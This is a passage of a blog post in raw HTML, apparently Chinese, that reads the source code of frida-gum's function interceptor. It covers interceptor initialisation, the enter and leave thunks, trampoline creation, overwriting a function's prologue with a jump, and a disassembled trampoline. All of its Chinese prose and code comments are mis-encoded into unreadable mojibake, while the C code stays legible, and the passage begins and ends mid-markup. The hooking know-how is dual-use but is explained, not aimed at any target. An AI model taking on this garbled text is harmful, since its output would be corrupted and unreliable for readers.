class="line">â”œâ”€â”€ backend-darwin</span><br><span class="line">â”œâ”€â”€ backend-dbghelp</span><br><span class="line">â”œâ”€â”€ backend-elf</span><br><span class="line">â”œâ”€â”€ backend-libdwarf</span><br><span class="line">â”œâ”€â”€ backend-libunwind</span><br><span class="line">â”œâ”€â”€ backend-linux</span><br><span class="line">â”œâ”€â”€ backend-mips</span><br><span class="line">â”œâ”€â”€ backend-posix</span><br><span class="line">â”œâ”€â”€ backend-qnx</span><br><span class="line">â”œâ”€â”€ backend-windows</span><br><span class="line">â””â”€â”€ backend-x86</span><br><span class="line">....&#x2F;&#x2F; gumä¸‹å…¶ä»–æ–‡ä»¶</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰å¿…è¦è¯´ä¸€ä¸‹ï¼Œ<code>frida-gum</code> ä¸ºäº†å®ç°è·¨å¹³å°ï¼ŒæŠ½è±¡å‡ºæ¥ <code>æ„æ¶æ— å…³/å¹³å°æ— å…³/ç³»ç»Ÿæ— å…³</code>çš„apiï¼Œæ¯”å¦‚ä¸€äº›å†…å­˜æ“ä½œï¼Œåœ¨<code>frida-gum</code>é‡Œå¯èƒ½å°±æ˜¯<code>gum_xxxxx</code>ï¼Œä½†æ˜¯æ ¹æ®ä¸åŒå¹³å°ï¼Œè°ƒç”¨åˆ°å¯¹åº”å¹³å°çš„apié‡Œå»ï¼Œæ­£æ˜¯åšäº†å¾ˆå¥½çš„å°è£…ï¼Œä¸Šå±‚ä»£ç æ‰ä¼šçœ‹èµ·æ¥â€œå¹³å°æ— å…³â€ã€‚</p><p>è¿˜æœ‰å‡ ä¸ªæ ¸å¿ƒçš„å¯¹è±¡ï¼Œåé¢çš„ä»£ç é‡Œé¢‘ç¹æåŠï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">GumInterceptor</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  GObject parent;</span><br><span class="line"></span><br><span class="line">  GRecMutex mutex;</span><br><span class="line"></span><br><span class="line">  GHashTable * function_by_address;</span><br><span class="line"></span><br><span class="line">  GumInterceptorBackend * backend;</span><br><span class="line">  GumCodeAllocator allocator;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">volatile</span> guint selected_thread_id;</span><br><span class="line"></span><br><span class="line">  GumInterceptorTransaction current_transaction;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä»è¿™ä¸ªæ‹¦æˆªå™¨ç±»ç´¢å¼•å‡ºå»çš„å¯¹è±¡éƒ½éœ€è¦å¥½å¥½æ³¨æ„ï¼Œæ¯”å¦‚ <code>GumInterceptorBackend</code> , æœ€å¥½å¯ä»¥ç”Ÿæˆä¸€ä¸ªumlå›¾ï¼Œé˜…è¯»ä»£ç çš„æ—¶å€™å¯¹æ¯”ç€çœ‹ã€‚</p><h3 id="2-2-ä»£ç é˜…è¯»"><a href="#2-2-ä»£ç é˜…è¯»" class="headerlink" title="2.2. ä»£ç é˜…è¯»"></a>2.2. ä»£ç é˜…è¯»</h3><h4 id="2-2-1-å‡†å¤‡å·¥ä½œ"><a href="#2-2-1-å‡†å¤‡å·¥ä½œ" class="headerlink" title="2.2.1 å‡†å¤‡å·¥ä½œ"></a>2.2.1 å‡†å¤‡å·¥ä½œ</h4><p>é¢å¯¹æ¯”è¾ƒå¤§çš„ä»£ç ï¼Œé‡è¦çš„æ˜¯æ‰¾åˆ°ä¸€ä¸ªå…¥å£ï¼Œä»è¿™ä¸ªç‚¹å¼€å§‹è¯»ï¼Œæˆ‘è¿™é‡Œå¤§æ¦‚çœ‹äº†ä¸‹å•å…ƒæµ‹è¯•çš„ä»£ç ï¼Œå‘ç°åŸºæœ¬æ˜¯: åˆå§‹åŒ–ï¼Œæµ‹è¯•å„ç§åŠŸèƒ½ï¼Œæ¸…ç†ï¼Œé€€å‡ºã€‚</p><p>é‚£ä¹ˆæˆ‘çš„é˜…è¯»æ€è·¯å°±æ˜¯ : </p><ol><li>åˆå§‹åŒ–éƒ¨åˆ†</li><li>å„ç§åŠŸèƒ½ï¼Œæ¯”å¦‚ å†…å­˜æ¨¡å—ï¼ŒæŒ‡ä»¤è¯»å†™æ¨¡å—ï¼Œä»£ç ä¿®å¤æ¨¡å—</li><li>æ¸…ç† è¿™éƒ¨åˆ†å¤§æ¦‚è¿‡ä¸€ä¸‹å°±è¡Œ</li></ol><p>è¿™é‡Œæˆ‘å‚è€ƒäº† <code>jmpews</code>å¸ˆå‚…çš„å…³äºè®¾è®¡hookæ¡†æ¶çš„æ–‡ç« ï¼Œäº†è§£ä¸€ä¸ªhookæ¡†æ¶å¦‚ä½•è®¾è®¡ï¼Œåˆ†å“ªäº›æ¨¡å—ï¼Œåœ¨é˜…è¯»ä»£ç çš„æ—¶å€™èƒ½å¤Ÿæœ‰é’ˆå¯¹æ€§ä¸€äº›ã€‚</p><ul><li>å†…å­˜åˆ†é… æ¨¡å— </li><li>æŒ‡ä»¤å†™ æ¨¡å— </li><li>æŒ‡ä»¤è¯» æ¨¡å— </li><li>æŒ‡ä»¤ä¿®å¤ æ¨¡å— relocator </li><li>è·³æ¿ æ¨¡å— </li><li>è°ƒåº¦å™¨ æ¨¡å— enter_thunkéƒ¨åˆ†å®ç° </li><li>æ ˆ æ¨¡å—</li></ul><p>å…·ä½“å¯ä»¥å‚è€ƒä»–çš„æ–‡ç« : <a href="https://bbs.pediy.com/thread-220794.htm">å¦‚ä½•æ„å»ºä¸€æ¬¾åƒ frida ä¸€æ ·çš„æ¡†æ¶</a></p><h4 id="2-2-2-hookä»0åˆ°1"><a href="#2-2-2-hookä»0åˆ°1" class="headerlink" title="2.2.2 hookä»0åˆ°1"></a>2.2.2 hookä»0åˆ°1</h4><p>é˜…è¯»é¡ºåºæ ¹æ®å•å…ƒæµ‹è¯•<code>gum-test.c</code>ç¡®å®šçš„ï¼Œå…·ä½“çš„å¯ä»¥çœ‹ä»£ç </p><h5 id="gum-interceptor-obtain"><a href="#gum-interceptor-obtain" class="headerlink" title="gum_interceptor_obtain()"></a>gum_interceptor_obtain()</h5><p>è¿™éƒ¨åˆ†æ˜¯ æ‹¦æˆªå™¨åˆå§‹åŒ–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆå§‹åŒ– interceptor å¯¹è±¡åˆå§‹åŒ–</span></span><br><span class="line">GumInterceptor *</span><br><span class="line">gum_interceptor_obtain (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  GumInterceptor * interceptor;</span><br><span class="line"></span><br><span class="line">  g_mutex_lock (&amp;_gum_interceptor_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_the_interceptor != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    interceptor = GUM_INTERCEPTOR (g_object_ref (_the_interceptor));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _the_interceptor = g_object_new (GUM_TYPE_INTERCEPTOR, <span class="literal">NULL</span>);</span><br><span class="line">    g_object_weak_ref (G_OBJECT (_the_interceptor),</span><br><span class="line">        the_interceptor_weak_notify, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    interceptor = _the_interceptor;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  g_mutex_unlock (&amp;_gum_interceptor_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> interceptor;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">gum_interceptor_init (GumInterceptor * self)</span><br><span class="line">&#123;</span><br><span class="line">  g_rec_mutex_init (&amp;self-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  self-&gt;function_by_address = g_hash_table_new_full (<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">      (GDestroyNotify) gum_function_context_destroy);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ†é…å™¨åˆå§‹åŒ–</span></span><br><span class="line">  gum_code_allocator_init (&amp;self-&gt;allocator, GUM_INTERCEPTOR_CODE_SLICE_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// åˆ›å»ºæ‹¦æˆªå™¨åç«¯</span></span><br><span class="line">  self-&gt;backend = _gum_interceptor_backend_create (&amp;self-&gt;allocator);</span><br><span class="line"></span><br><span class="line">  gum_interceptor_transaction_init (&amp;self-&gt;current_transaction, self);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºGObjectçš„ä½¿ç”¨ï¼Œ<code>gum_interceptor_init</code> è¿™ä¸ªæ„é€ å‡½æ•°ï¼Œåœ¨ <code>interceptor</code>å¯¹è±¡åˆ›å»ºå‡ºæ¥çš„æ—¶å€™è§¦å‘ã€‚</p><p>é‡ç‚¹çœ‹æ‹¦æˆªå™¨åç«¯çš„åˆå§‹åŒ–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GumInterceptorBackend *</span><br><span class="line">_gum_interceptor_backend_create (GumCodeAllocator * allocator)</span><br><span class="line">&#123;</span><br><span class="line">  GumInterceptorBackend * backend;</span><br><span class="line"></span><br><span class="line">  backend = g_slice_new (GumInterceptorBackend);</span><br><span class="line">  backend-&gt;allocator = allocator;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//åˆå§‹åŒ– codewriterå’Œrelocator</span></span><br><span class="line">  gum_x86_writer_init (&amp;backend-&gt;writer, <span class="literal">NULL</span>);</span><br><span class="line">  gum_x86_relocator_init (&amp;backend-&gt;relocator, <span class="literal">NULL</span>, &amp;backend-&gt;writer);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// åˆ›å»º thunk</span></span><br><span class="line">  gum_interceptor_backend_create_thunks (backend);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> backend;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆå§‹åŒ–çš„<code>writer</code>å’Œ<code>relocator</code>åˆ†åˆ«ç”¨äºæŒ‡ä»¤å†™å’ŒæŒ‡ä»¤æ¢å¤ã€‚</p><p><code>thunks</code>çš„åˆå§‹åŒ–ï¼Œè¿™ä¸¤ä¸ªæ˜¯ç”¨äºè°ƒåº¦æ‰§è¡Œï¼Œåˆ†åˆ«å¯¹åº” è¿›å…¥hookå’Œç¦»å¼€hookã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">gum_interceptor_backend_create_thunks (GumInterceptorBackend * self)</span><br><span class="line">&#123;</span><br><span class="line">  GumX86Writer * cw = &amp;self-&gt;writer;</span><br><span class="line"></span><br><span class="line">  self-&gt;enter_thunk = gum_code_allocator_alloc_slice (self-&gt;allocator);</span><br><span class="line">  gum_x86_writer_reset (cw, self-&gt;enter_thunk-&gt;data);</span><br><span class="line">  gum_emit_enter_thunk (cw);</span><br><span class="line">  gum_x86_writer_flush (cw);</span><br><span class="line">  g_assert_cmpuint (gum_x86_writer_offset (cw), &lt;=, self-&gt;enter_thunk-&gt;size);</span><br><span class="line"></span><br><span class="line">  self-&gt;leave_thunk = gum_code_allocator_alloc_slice (self-&gt;allocator);</span><br><span class="line">  gum_x86_writer_reset (cw, self-&gt;leave_thunk-&gt;data);</span><br><span class="line">  gum_emit_leave_thunk (cw);</span><br><span class="line">  gum_x86_writer_flush (cw);</span><br><span class="line">  g_assert_cmpuint (gum_x86_writer_offset (cw), &lt;=, self-&gt;leave_thunk-&gt;size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºåŸç†ç±»ä¼¼ï¼Œåªä¸¾ä¾‹<code>enter_thunk</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">gum_emit_enter_thunk (GumX86Writer * cw)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> gssize return_address_stack_displacement = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// save ret addr</span></span><br><span class="line">  gum_emit_prolog (cw, return_address_stack_displacement);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æ„é€ è‡ªå·±çš„å‡½æ•°æ ˆ</span></span><br><span class="line">  gum_x86_writer_put_lea_reg_reg_offset (cw, GUM_REG_XSI,</span><br><span class="line">      GUM_REG_XBP, GUM_FRAME_OFFSET_CPU_CONTEXT);</span><br><span class="line">  gum_x86_writer_put_lea_reg_reg_offset (cw, GUM_REG_XDX,</span><br><span class="line">      GUM_REG_XBP, GUM_FRAME_OFFSET_TOP);</span><br><span class="line">  gum_x86_writer_put_lea_reg_reg_offset (cw, GUM_REG_XCX,</span><br><span class="line">      GUM_REG_XBP, GUM_FRAME_OFFSET_NEXT_HOP);</span><br><span class="line"></span><br><span class="line">  gum_x86_writer_put_call_address_with_aligned_arguments (cw, GUM_CALL_CAPI,</span><br><span class="line">      GUM_ADDRESS (_gum_function_context_begin_invocation), <span class="number">4</span>,</span><br><span class="line">      GUM_ARG_REGISTER, GUM_REG_XBX,</span><br><span class="line">      GUM_ARG_REGISTER, GUM_REG_XSI,</span><br><span class="line">      GUM_ARG_REGISTER, GUM_REG_XDX,</span><br><span class="line">      GUM_ARG_REGISTER, GUM_REG_XCX);</span><br><span class="line"></span><br><span class="line">  gum_emit_epilog (cw);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="gum-interceptor-attach-listener"><a href="#gum-interceptor-attach-listener" class="headerlink" title="gum_interceptor_attach_listener"></a>gum_interceptor_attach_listener</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GumAttachReturn</span><br><span class="line">gum_interceptor_attach_listener (GumInterceptor * self,</span><br><span class="line">                                 gpointer function_address,</span><br><span class="line">                                 GumInvocationListener * listener,</span><br><span class="line">                                 gpointer listener_function_data)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="gum-interceptor-transaction-begin"><a href="#gum-interceptor-transaction-begin" class="headerlink" title="gum_interceptor_transaction_begin"></a>gum_interceptor_transaction_begin</h6><h6 id="gum-interceptor-instrument-âœ¨"><a href="#gum-interceptor-instrument-âœ¨" class="headerlink" title="gum_interceptor_instrument âœ¨"></a>gum_interceptor_instrument âœ¨</h6><p>è¿™é‡Œè¦è¯´çš„æ˜¯ function_address å°±æ˜¯è¦hookçš„ç›®æ ‡å‡½æ•°ï¼Œ<code>frida-gum</code>æŠŠè¦hookçš„ç›®æ ‡å°è£…æˆäº† <code>GumFunctionContext</code>å¯¹è±¡ï¼Œæ–¹ä¾¿æ“ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function_address = gum_interceptor_resolve (self, function_address); <span class="comment">// ?</span></span><br><span class="line">  <span class="comment">// åˆ›å»ºè·³æ¿</span></span><br><span class="line">  function_ctx = gum_interceptor_instrument (self, function_address);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> GumFunctionContext *</span><br><span class="line">gum_interceptor_instrument (GumInterceptor * self,</span><br><span class="line">                            gpointer function_address)</span><br><span class="line">&#123;</span><br><span class="line">  GumFunctionContext * ctx;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// è¦hookçš„å‡½æ•°ï¼Œå°è£…æˆäº† GumFunctionContextï¼Œæ­¤æ—¶</span></span><br><span class="line">  <span class="comment">// æ ¹æ® åœ°å€ï¼Œå¾—åˆ°ä¸ä¹‹å¯¹åº”çš„ GunFunctionContextå¯¹è±¡</span></span><br><span class="line">  ctx = (GumFunctionContext *) g_hash_table_lookup (self-&gt;function_by_address,</span><br><span class="line">      function_address);</span><br><span class="line">  <span class="keyword">if</span> (ctx != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> ctx;</span><br><span class="line">  <span class="comment">// å¦‚æœè·å–åˆ°çš„æ˜¯ç©ºçš„å¯¹è±¡ï¼Œå¿…é¡»åˆå§‹åŒ–äº†æ‰èƒ½ä½¿ç”¨</span></span><br><span class="line">  <span class="comment">// åªå†™å‡ ä¸ªå­—æ–­ï¼Œåˆ†é…å†…å­˜/hookçš„å‡½æ•°åœ°å€/interceptoræˆå‘˜</span></span><br><span class="line">  ctx = gum_function_context_new (self, function_address);</span><br><span class="line">  <span class="keyword">if</span> (ctx == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="comment">// åˆ›å»ºè·³æ¿</span></span><br><span class="line">  <span class="keyword">if</span> (!_gum_interceptor_backend_create_trampoline (self-&gt;backend, ctx))</span><br><span class="line">  &#123;</span><br><span class="line">    gum_function_context_finalize (ctx);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// è®¾ç½®å®Œæˆåï¼Œ æ·»åŠ åˆ°å“ˆå¸Œè¡¨</span></span><br><span class="line">  <span class="comment">// hash_table, key, value</span></span><br><span class="line">  <span class="comment">// hookå‡½æ•°åœ°å€ï¼ŒGumFunctionContextå¯¹è±¡å¯¹åº”ï¼Œ æ–¹ä¾¿æŸ¥æ‰¾</span></span><br><span class="line">  g_hash_table_insert (self-&gt;function_by_address, function_address, ctx);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å½“å‰ transaction æ·»åŠ åˆ° ä»»åŠ¡ä¸­ï¼Œ è®¾ç½®å›è°ƒ å‡½æ•° gum_interceptor_activate æ‹¦æˆªå™¨æ¿€æ´»å‡½æ•°</span></span><br><span class="line">  gum_interceptor_transaction_schedule_prologue_write (</span><br><span class="line">      &amp;self-&gt;current_transaction, ctx, gum_interceptor_activate);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ctx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè´´ä¸€ä¸‹è·³æ¿ä»£ç æ–¹ä¾¿ç†è§£ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00C30200  mov         al,byte ptr ds:[FF00C121h]  </span><br><span class="line">00C30205  xor         eax,0C30200h  </span><br><span class="line">00C3020A  jmp         00C30000   &#x2F;&#x2F; è·³åˆ°ä¸Šé¢çš„ enter_thunk</span><br><span class="line">00C3020F  push        dword ptr ds:[0C30200h]  </span><br><span class="line">00C30215  jmp         00C30100  &#x2F;&#x2F; è·³åˆ° leave_thunk</span><br><span class="line">&#x2F;&#x2F; åŸå‡½æ•°ä¿®å¤çš„æŒ‡ä»¤ï¼Œ7ä¸ªå­—èŠ‚</span><br><span class="line">00C3021A  push        ebp  </span><br><span class="line">00C3021B  mov         ebp,esp  </span><br><span class="line">00C3021D  cmp         dword ptr [ebp+8],0  </span><br><span class="line">00C30221  jmp         gum_test_target_function+7h (0D6FB97h) &#x2F;&#x2F; è·³å›åŸå‡½æ•°ï¼Œå› ä¸ºå†™è·³è½¬ç”¨äº†7å­—èŠ‚ï¼Œæ‰€ä»¥+7</span><br></pre></td></tr></table></figure><h6 id="gum-interceptor-transaction-end"><a href="#gum-interceptor-transaction-end" class="headerlink" title="gum_interceptor_transaction_end"></a>gum_interceptor_transaction_end</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å½“å‰ transaction æ·»åŠ åˆ° ä»»åŠ¡ä¸­ï¼Œ è®¾ç½®å›è°ƒ å‡½æ•° gum_interceptor_activate æ‹¦æˆªå™¨æ¿€æ´»å‡½æ•°</span></span><br><span class="line">  gum_interceptor_transaction_schedule_prologue_write (</span><br><span class="line">      &amp;self-&gt;current_transaction, ctx, gum_interceptor_activate);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ‹¦æˆªå™¨æ¿€æ´»</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">gum_interceptor_activate (GumInterceptor * self,</span><br><span class="line">                          GumFunctionContext * ctx,</span><br><span class="line">                          gpointer prologue)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (ctx-&gt;destroyed)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  g_assert (!ctx-&gt;activated);</span><br><span class="line">  ctx-&gt;activated = TRUE;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æ¿€æ´»</span></span><br><span class="line">  _gum_interceptor_backend_activate_trampoline (self-&gt;backend, ctx,</span><br><span class="line">      prologue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">_gum_interceptor_backend_activate_trampoline (GumInterceptorBackend * self,</span><br><span class="line">                                              GumFunctionContext * ctx,</span><br><span class="line">                                              gpointer prologue)</span><br><span class="line">&#123;</span><br><span class="line">  GumX86Writer * cw = &amp;self-&gt;writer;</span><br><span class="line">  guint padding;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// è®¾ç½®base</span></span><br><span class="line">  gum_x86_writer_reset (cw, prologue);</span><br><span class="line">  <span class="comment">// è®¾ç½®pc</span></span><br><span class="line">  cw-&gt;pc = GPOINTER_TO_SIZE (ctx-&gt;function_address);</span><br><span class="line">  <span class="comment">// å†™jmpï¼Œ è·³è½¬åˆ° è·³æ¿ä¸­ï¼Œ è¿›å…¥è·³æ¿è¿™å·²ç»åˆ°hooké‡Œäº†</span></span><br><span class="line">  gum_x86_writer_put_jmp_address (cw, GUM_ADDRESS (ctx-&gt;on_enter_trampoline));</span><br><span class="line">  gum_x86_writer_flush (cw);</span><br><span class="line">  g_assert_cmpint (gum_x86_writer_offset (cw),</span><br><span class="line">      &lt;=, GUM_INTERCEPTOR_REDIRECT_CODE_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// åŸæœ¬ä»£ç ï¼ˆhookç‚¹ï¼‰ï¼Œå‰©ä½™çš„åœ°æ–¹nopè¡¥é½</span></span><br><span class="line">  padding = ctx-&gt;overwritten_prologue_len - gum_x86_writer_offset (cw);</span><br><span class="line">  <span class="keyword">for</span> (; padding != <span class="number">0</span>; padding--)</span><br><span class="line">    gum_x86_writer_put_nop (cw);</span><br><span class="line">  gum_x86_writer_flush (cw);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-3-æ‰§è¡Œæµç¨‹"><a href="#2-2-3-æ‰§è¡Œæµç¨‹" class="headerlink" title="2.2.3 æ‰§è¡Œæµç¨‹"></a>2.2.3 æ‰§è¡Œæµç¨‹</h4><p>é€šè¿‡è®¾ç½®å‡½æ•°è¿”å›åœ°å€(<code>__gum_function_context_begin/end_invocation</code>)ï¼Œæ§åˆ¶æµç¨‹ï¼Œè¿™å°±æ˜¯ROPï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">åŸå‡½æ•°</span><br><span class="line">----------------------------------------------------</span><br><span class="line">è·³æ¿ 02C80204</span><br><span class="line">----------------------------------------------------</span><br><span class="line">&#96;enter_chunk&#96;  &#x2F;&#x2F; é¦–å…ˆè¦ä¿å­˜ç°åœº, æ„é€ æ ˆå¸§ï¼Œéšåè¿›å…¥ä¸‹ä¸€ä¸ªå‡½æ•° â¬‡ï¸</span><br><span class="line">&#96;__gum_function_context_begin_invocation&#96; &#x2F;&#x2F; é€šè¿‡è®¾ç½®æ ˆ(ret addr)æ§åˆ¶æ‰§è¡Œæµç¨‹ </span><br><span class="line">----------------------------------------------------</span><br><span class="line">replacement_function</span><br><span class="line">----------------------------------------------------</span><br><span class="line">è·³æ¿ 02C8020F</span><br><span class="line">----------------------------------------------------</span><br><span class="line">&#96;leave_chunk&#96;</span><br><span class="line">&#96;__gum_function_context_end_invocation&#96; </span><br><span class="line">----------------------------------------------------</span><br><span class="line">ç»§ç»­æ‰§è¡Œ</span><br></pre></td></tr></table></figure><h2 id="0x03-è°ƒè¯•åˆ†æå¸®åŠ©ç†è§£"><a 